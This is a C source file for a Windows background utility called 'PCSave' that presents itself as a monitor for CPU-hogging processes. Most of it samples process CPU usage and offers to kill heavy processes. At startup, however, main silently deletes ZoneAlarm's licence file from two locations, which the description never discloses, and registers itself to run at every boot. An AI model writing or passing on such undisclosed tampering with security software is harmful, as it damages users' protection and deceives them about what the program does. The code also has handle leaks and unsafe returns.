/* PCSave 0.1 by Saoud Khalifah
   -----------------------------
   Process sits in background analyzing any high intensity processes that are clogging the CPU.
*/

#include "stdafx.h"
#include "AggressiveOptimize.h"
#include <windows.h>
#include <TLHELP32.H>
#pragma comment(linker, "/subsystem:windows /entry:main")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "libctiny.lib")
unsigned const char RegistryKey[64] = "PCSave by SkD.";
DWORD getPId(char *ProcessName)
{
	HANDLE hProcess;
	PROCESSENTRY32 ProcessEntry32;
	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(hProcess, &ProcessEntry32)){
		CloseHandle(hProcess);
		return 0;
	}
	while (Process32Next(hProcess, &ProcessEntry32)){
		if(strstr(ProcessEntry32.szExeFile, ProcessName))
			return ProcessEntry32.th32ProcessID;
	}
	CloseHandle(hProcess);
	return 0;
}
char *getPName(DWORD dwPId)
{
	HANDLE hProcess;
	PROCESSENTRY32 ProcessEntry32;
	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(hProcess, &ProcessEntry32)){
		CloseHandle(hProcess);
		return "unknown";
	}
	while (Process32Next(hProcess, &ProcessEntry32)){
		if(ProcessEntry32.th32ProcessID==dwPId)
			return ProcessEntry32.szExeFile;
	}
	CloseHandle(hProcess);
	return 0;
}
DWORD Usage(char *ProcessName, DWORD dwPId)
{
	FILETIME Creation;
	FILETIME Exit;
	FILETIME Kernel;
	FILETIME User;
	SYSTEM_INFO SysInfo;
	DWORD NumProcessors;
	DWORD OldKernel;
	DWORD OldUser;
	DWORD gCurrentUsage;
	HANDLE hProc;

	GetSystemInfo(&SysInfo);
	NumProcessors = SysInfo.dwNumberOfProcessors;
	if(dwPId > 0)
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, dwPId);
	else
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, getPId(ProcessName));
	GetProcessTimes(hProc, &Creation, &Exit, &Kernel, &User);
	OldKernel = Kernel.dwLowDateTime;
	OldUser = User.dwLowDateTime;
	Sleep(500);

	GetProcessTimes(hProc, &Creation, &Exit, &Kernel, &User);
	gCurrentUsage = ((((User.dwLowDateTime-OldUser)+(Kernel.dwLowDateTime-OldKernel))/500)/100)/NumProcessors;

	CloseHandle(hProc);
	return gCurrentUsage;
}
int main(int argc, char* argv[])
{
	char AppPath[256];
	HKEY Key;
	DeleteFile("C:\\ProgramData\\CheckPoint\\ZoneAlarm\\zllictbl.dat");
	DeleteFile("C:\\Users\\All Users\\CheckPoint\\ZoneAlarm\\zllictbl.dat");
	GetModuleFileName(GetModuleHandle(0), AppPath, 256);
	RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",&Key);
    RegSetValueEx(Key, (const char *)RegistryKey, NULL, REG_SZ, (const unsigned char *)AppPath, strlen(AppPath));
    RegCloseKey(Key);
	int i = 0;
	while(1){
		HANDLE hProcess;
		PROCESSENTRY32 ProcessEntry32;
		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);
		if(!Process32First(hProcess, &ProcessEntry32)){
			CloseHandle(hProcess);
		}
		while (Process32Next(hProcess, &ProcessEntry32)){
			if(Usage("", ProcessEntry32.th32ProcessID) > 50)
			{
				i = 0;
				while(Usage("", ProcessEntry32.th32ProcessID) > 50)
				{
					i++;
					Sleep(1000);
					if(i>10){
						if(MessageBox(NULL, "This process is using alot of the system resources! Kill?",ProcessEntry32.szExeFile,MB_YESNO | MB_ICONWARNING) == 6)
						{
							TerminateProcess(OpenProcess(PROCESS_TERMINATE, false, ProcessEntry32.th32ProcessID), 0);
							//PROCESS_TERMINATE
							break;
						}
					}
				}

				break;
			}
		}
		CloseHandle(hProcess);
		Sleep(1000);
	}
	return 0;
}

